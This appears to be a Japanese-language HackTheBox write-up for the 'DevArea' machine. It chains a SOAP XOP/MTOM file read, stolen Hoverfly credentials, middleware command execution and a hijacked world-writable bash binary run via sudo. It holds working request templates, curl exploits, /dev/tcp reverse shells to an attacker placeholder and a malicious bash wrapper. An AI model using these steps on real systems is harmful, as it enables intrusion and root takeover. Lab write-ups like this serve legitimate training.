🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# DevArea：HackTheBox ライトアップ

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/88d6d295a9624c91cbdae1e0215cb354.png" width="120"/>
<div>

**難易度**: Medium  
**OS**: Linux  
**タイプ**: Web / ミドルウェア  

</div>
</div>

---

## 攻撃チェーンの概要

```
LFI via XOP/MTOM (SOAP) → /etc/systemd/system/hoverfly.service
→ Hoverfly 認証情報 → JWT トークン
→ ミドルウェア経由の RCE (bash リバースシェル)
→ /usr/bin/bash world-writable + sudo syswatch.sh → ROOT
```

---

## 列挙

### Nmap スキャン

```bash
nmap -sV -sC <TARGET_IP> -oN scan.txt
```

開放ポート：
- **8080**：従業員 SOAP サービス (`/employeeservice`)
- **8888**：Hoverfly 管理 API

### サービス発見

ポート 8080 の SOAP サービスは `submitReport` エンドポイントを公開している。  
ポート 8888 の Hoverfly 管理パネルは `/api/token-auth` と `/api/v2/hoverfly/middleware` を公開している。

---

## 初期侵入：XOP/MTOM 経由の LFI

### 脆弱性

SOAP の `submitReport` エンドポイントは MTOM (Message Transmission Optimization Mechanism) リクエストを受け付ける。`<content>` フィールドは `<xop:Include>` 参照をサポートしており、`file://` スキームを使って**ローカルファイル**を参照できる。これにより**認証不要の LFI** が成立する。

### リクエストテンプレート

```
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="..." xmlns:tns="http://devarea.htb/">
<soap:Body><tns:submitReport><arg0>
  <confidential>false</confidential>
  <content>
    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
      href="file:///etc/systemd/system/hoverfly.service"/>
  </content>
  <department>x</department>
  <employeeName>x</employeeName>
</arg0></tns:submitReport></soap:Body>
</soap:Envelope>
--MIMEBoundary--
```

レスポンスの `<return>` タグ内にファイルの内容が base64 エンコードされて返される。

### Hoverfly 認証情報の抽出

```bash
curl -s -X POST http://<TARGET_IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @lfi_payload.txt
```

サービスファイルには以下のような行が含まれる：
```
ExecStart=/usr/bin/hoverfly -webserver -pp 8080 -ap 8888 \
  -username admin -password <HOVERFLY_PASSWORD>
```

`-password` フラグから平文パスワードを抽出する。

---

## ユーザーシェル：Hoverfly ミドルウェア経由の RCE

### Hoverfly への認証

```bash
curl -s -X POST http://<TARGET_IP>:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<パスワード>"}'
```

JWT トークンを取得する。

### ミドルウェア RCE

Hoverfly のミドルウェア機能は、プロキシされた各リクエストに対して実行するバイナリとスクリプトを指定できる。`/bin/bash` をバイナリ、リバースシェルのワンライナーをスクリプトとして設定することで、任意コマンド実行が可能になる：

```bash
curl -s -X PUT http://<TARGET_IP>:8888/api/v2/hoverfly/middleware \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1 &"
  }'
```

### リスナー

```bash
nc -lvnp 4444
```

サービスユーザーとしてシェルを取得する。

---

## ユーザーフラグ

```bash
cat ~/user.txt
```

---

## 権限昇格

### 列挙

```bash
find / -writable -type f 2>/dev/null | grep -v proc
sudo -l
```

重要な発見：
- `/usr/bin/bash` が **world-writable** になっている
- ユーザーはパスワードなしで `sudo /opt/syswatch/syswatch.sh` を実行できる

### 攻撃の方針

`/usr/bin/bash` が world-writable であるため、元のバイナリを復元する前に root リバースシェルを起動する悪意あるラッパーに置き換えることができる。`sudo /opt/syswatch/syswatch.sh` が実行されると（内部で `/usr/bin/bash` を呼び出す）、root としてペイロードが発動する。

### 手順

**1. 元の bash をバックアップ：**

```bash
cp /bin/bash /tmp/bash.bak
```

**2. 悪意ある `/usr/bin/bash` を作成：**

```python
python3 -c "
import binascii
evil = (
    b'#!/tmp/bash.bak\n'
    b'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1 &\n'
    b'cp /tmp/bash.bak /usr/bin/bash\n'
    b'exec /tmp/bash.bak \"\$@\"\n'
)
open('/tmp/evil_bash','wb').write(evil)
"
chmod +x /tmp/evil_bash
```

> `ETXTBSY`（テキストファイルビジー）エラーを避けるため、まず `/tmp` に書き込み、その後 `/usr/bin/bash` にコピーする。

**3. root リスナーを起動：**

```bash
nc -lvnp 4445
```

**4. チェーンを起動：**

```bash
/bin/dash -c '
  killall -9 bash;
  sleep 2;
  cp /tmp/evil_bash /usr/bin/bash;
  sudo /opt/syswatch/syswatch.sh --version
' &
```

> 自分のセッションを終了させないよう、bash の代わりに `/bin/dash` を使用する。  
> `killall -9 bash` によってカーネルが `/usr/bin/bash` のロックを解放し、上書きが可能になる。

### root シェル

`root` としてシェルを取得する。

---

## root フラグ

```bash
cat /root/root.txt
```